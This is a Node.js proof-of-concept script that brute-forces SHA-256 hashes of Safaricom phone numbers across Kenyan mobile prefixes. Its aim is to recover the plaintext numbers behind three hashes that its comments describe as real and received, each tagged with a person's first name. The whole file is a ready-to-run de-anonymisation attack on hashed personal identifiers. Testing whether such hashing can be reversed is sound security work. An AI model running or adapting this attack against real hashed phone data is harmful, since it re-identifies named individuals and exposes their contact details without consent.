// Proof-of-concept: can we reverse Safaricom's hashed MSISDN by brute force?
// Tries SHA-256 of the 12-digit MSISDN "2547XXXXXXXX" / "2541XXXXXXXX" across
// Safaricom mobile ranges and checks against real hashes we received.
const crypto = require('crypto');

const targets = new Map([
  ['5b478972aa98c4e6ee72fd32e8394e8df993383bc7c1c306eb9900156e3dc3a9', 'Joyce'],
  ['f0c48573ecdef82ab99416674df2e5318ec46be729fc519b1d6eb6c7b96780d8', 'FELIX'],
  ['66a3b7226903d4a20fc9b79642255e2efef2edbfa7f710930f653247c2748a7c', 'IDDA'],
]);

function sha256hex(s){ return crypto.createHash('sha256').update(s).digest('hex'); }

// Quick benchmark
let t0 = Date.now();
for (let i = 0; i < 2_000_000; i++) sha256hex('254712345678');
const rate = Math.round(2_000_000 / ((Date.now()-t0)/1000));
console.log(`benchmark: ~${rate.toLocaleString()} SHA-256/sec`);

// Safaricom mobile prefixes (digits after 254). Broad but realistic.
const prefixes = [];
for (let p = 700; p <= 729; p++) prefixes.push(String(p)); // 70X,71X,72X
for (const p of [740,741,742,743,744,745,746,748,757,758,759,768,769,763,790,791,792,793,794,795,796,797,798,799]) prefixes.push(String(p));
for (let p = 110; p <= 115; p++) prefixes.push(String(p)); // 011X
console.log(`scanning ${prefixes.length} Safaricom prefixes x 1,000,000 = ${(prefixes.length*1e6).toLocaleString()} numbers`);

let found = 0, scanned = 0;
const start = Date.now();
outer:
for (const pre of prefixes) {
  for (let n = 0; n < 1_000_000; n++) {
    const suffix = pre + String(n).padStart(6, '0');     // 9-digit local part
    const msisdn = '254' + suffix;                        // 2547XXXXXXXX
    const h = sha256hex(msisdn);
    if (targets.has(h)) {
      console.log(`*** MATCH: ${targets.get(h)} = ${msisdn}  (0${suffix})`);
      targets.delete(h);
      if (++found === 3) break outer;
    }
    if (++scanned % 20_000_000 === 0) {
      console.log(`  ...${(scanned/1e6)|0}M scanned, ${found} found, ${Math.round(scanned/((Date.now()-start)/1000)/1e6*10)/10}M/s`);
    }
  }
}
console.log(`done: ${found}/3 cracked in ${((Date.now()-start)/1000).toFixed(1)}s, ${scanned.toLocaleString()} scanned`);
